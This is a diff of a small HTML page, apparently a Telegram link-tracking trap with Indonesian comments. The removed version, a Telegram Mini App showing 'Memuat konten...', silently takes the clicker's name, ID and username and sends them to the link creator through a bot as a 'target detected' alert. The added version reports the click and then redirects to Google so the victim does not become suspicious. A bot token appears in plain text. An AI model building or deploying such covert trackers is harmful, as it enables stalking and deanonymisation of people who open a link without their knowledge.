@@ -1,42 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Redirecting...</title>
 </head>
-<body style="background: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
-    <p>Memuat konten...</p>
-
+<body style="background: white;">
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-
-        // 1. Ambil data si target (pengklik)
-        const target = tg.initDataUnsafe.user;
+        // Mengambil parameter dari URL web biasa
+        const urlParams = new URLSearchParams(window.location.search);
+        const myId = urlParams.get('id'); // ID kamu
         
-        // 2. Ambil ID KAMU (tujuan notif) dari parameter start_param
-        // Telegram secara otomatis memindahkan data "?startapp=ID" ke start_param
-        const idTujuanNotif = tg.initDataUnsafe.start_param; 
-        
-        // TOKEN BOT KAMU
         const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
 
-        if (target && idTujuanNotif) {
-            const pesanNotif = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${target.first_name}\n🆔 ID: ${target.id}\n🔗 User: @${target.username || 'n/a'}`;
+        if (myId) {
+            // Karena ini web biasa, kita tidak bisa ambil Nama Target secara otomatis.
+            // Kita hanya bisa kirim notif bahwa "Seseorang" telah klik.
+            const pesan = `🎯 **Link Kamu Diklik!**\n\nSeseorang baru saja membuka link kamu di channel.\n\n_Catatan: Karena ini web biasa, identitas nama hanya bisa didapat jika menggunakan Mini App._`;
 
-            // Kirim notif ke ID kamu yang membuat link tadi
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: idTujuanNotif, // Notif dikirim ke sini!
-                    text: pesanNotif,
+                    chat_id: myId,
+                    text: pesan,
                     parse_mode: 'Markdown'
                 })
             }).then(() => {
-                // Tutup otomatis dalam 0.5 detik
-                setTimeout(() => { tg.close(); }, 500);
-            }).catch(err => {
-                console.error("Gagal kirim notif:", err);
+                // Opsional: Alihkan ke situs lain agar tidak curiga (misal Google)
+                window.location.href = "https://www.google.com";
             });
         }
     </script>
